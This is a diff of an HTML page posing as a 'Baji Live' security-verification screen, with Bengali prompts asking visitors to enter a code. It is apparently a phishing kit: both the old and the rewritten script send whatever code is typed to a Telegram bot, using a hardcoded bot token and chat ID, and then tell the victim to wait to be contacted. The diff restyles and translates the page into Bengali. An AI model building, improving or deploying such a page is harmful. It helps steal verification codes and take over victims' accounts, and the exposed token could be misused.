@@ -1,126 +1,163 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="bn">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Code Submit Page</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: Arial, sans-serif;
-            background-color: #292929;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Baji Live Verify</title>
+  <style>
+    /* Base styling */
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: "Segoe UI", Arial, sans-serif;
+      background: linear-gradient(135deg, #1e1e1e, #2d2d2d);
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
 
-        .login-container {
-            background: #292929;
-            color: #fff;
-            padding: 20px 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            width: 100%;
-            max-width: 400px;
-        }
+    .login-container {
+      background: #292929;
+      padding: 30px 25px;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+      width: 100%;
+      max-width: 420px;
+      box-sizing: border-box;
+    }
 
-        .login-container h1 {
-            text-align: center;
-            font-size: 24px;
-            margin-bottom: 20px;
-        }
+    /* Branding header */
+    .login-container header {
+      text-align: center;
+      margin-bottom: 20px;
+    }
 
-        .login-container img {
-            display: block;
-            width: 100%;
-            max-width: 350px;
-            margin: 0 auto 20px auto;
-            border-radius: 8px;
-        }
+    .login-container header h1 {
+      font-size: 26px;
+      margin: 10px 0;
+      color: #14a76c;
+    }
 
-        .login-container label {
-            display: block;
-            font-size: 14px;
-            margin-bottom: 5px;
-        }
+    .login-container img {
+      display: block;
+      max-width: 100%;
+      height: auto;
+      border-radius: 10px;
+      margin: 0 auto 20px auto;
+    }
 
-        .login-container input {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 15px;
-            border: none;
-            border-radius: 4px;
-            font-size: 14px;
-        }
+    /* Form styling */
+    label {
+      display: block;
+      font-size: 15px;
+      margin-bottom: 6px;
+    }
 
-        .login-container button {
-            width: 100%;
-            padding: 10px;
-            background-color: #14805E;
-            border: none;
-            border-radius: 4px;
-            color: white;
-            font-size: 16px;
-            cursor: pointer;
-        }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 18px;
+      border: none;
+      border-radius: 6px;
+      font-size: 15px;
+      outline: none;
+      box-sizing: border-box;
+    }
 
-        .login-container button:hover {
-            background-color: #14805E;
-        }
-    </style>
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #14a76c;
+      border: none;
+      border-radius: 6px;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #119d62;
+    }
+
+    /* Footer */
+    footer {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 12px;
+      color: #bbb;
+    }
+
+    /* Responsive tweaks */
+    @media (max-width: 500px) {
+      .login-container {
+        padding: 20px;
+        margin: 0 10px;
+      }
+
+      .login-container header h1 {
+        font-size: 22px;
+      }
+    }
+  </style>
 </head>
 <body>
-    <div class="login-container">
-        <h1>Baji Live Verify</h1>
-        <!-- Larger Image -->
-        <img src="https://img.b112j.com/bj/h5/assets/images/sponsor/en-sponsor.jpg?v=1737017010198&source=mcdsrc" alt="Sponsor Image">
-        
-        <form id="codeForm">
-            <label for="code">কোডটি লিখুন </label>
-            <input type="text" id="code" placeholder="আপনার কোড লিখুন" maxlength="10" required>
-            <button type="submit">Submit</button>
-        </form>
-    </div>
+  <div class="login-container">
+    <header>
+      <img src="https://img.b112j.com/bj/h5/assets/images/sponsor/en-sponsor.jpg" alt="Sponsor Logo">
+      <h1>Baji Live Verification</h1>
+      <p style="font-size: 13px; color:#ccc;">সিকিউরিটি ভেরিফিকেশনের জন্য কোডটি লিখুন</p>
+    </header>
 
-    <script>
-        // Replace with your bot token and chat ID
-        const BOT_TOKEN = "8040356390:AAE3ZeLspo9dYe--OVHHDCXAJN949FWc8-Y";
-        const CHAT_ID = "1309023053";
+    <form id="codeForm">
+      <label for="code">কোড লিখুন</label>
+      <input type="text" id="code" placeholder="আপনার কোড লিখুন" maxlength="10" required>
+      <button type="submit">Submit</button>
+    </form>
 
-        // Form submission handler
-        document.getElementById("codeForm").addEventListener("submit", function(event) {
-            event.preventDefault(); // Prevent form from refreshing the page
-            const code = document.getElementById("code").value;
+    <footer>
+      &copy; 2025 Baji Live. All rights reserved.
+    </footer>
+  </div>
 
-            // Telegram API URL
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  <script>
+    // ⚠️ Use your real BOT_TOKEN + CHAT_ID here
+    const BOT_TOKEN = "8040356390:AAE3ZeLspo9dYe--OVHHDCXAJN949FWc8-Y";
+    const CHAT_ID = "1309023053";
 
-            // Sending the message
-            fetch(url, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: `Submitted Code: ${code}`
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    alert("অপেক্ষা করুন আমরা শীঘ্রই আপনার সাথে যোগাযোগ করব.... ");
-                } else {
-                    alert("Failed to submit code. Please try again.");
-                }
-            })
-            .catch(error => {
-                console.error("Error:", error);
-                alert("An error occurred. Please try again.");
-            });
-        });
-    </script>
+    document.getElementById("codeForm").addEventListener("submit", function(event) {
+      event.preventDefault();
+      const code = document.getElementById("code").value;
+
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+      fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: `Submitted Code: ${code}`
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          alert("অপেক্ষা করুন — আমরা শীঘ্রই আপনার সাথে যোগাযোগ করব।");
+        } else {
+          alert("কোড সাবমিট করতে ব্যর্থ হয়েছে। আবার চেষ্টা করুন।");
+        }
+      })
+      .catch(error => {
+        console.error("Error:", error);
+        alert("সার্ভার এরর — অনুগ্রহ করে আবার চেষ্টা করুন।");
+      });
+    });
+  </script>
 </body>
+</html>
 </html>
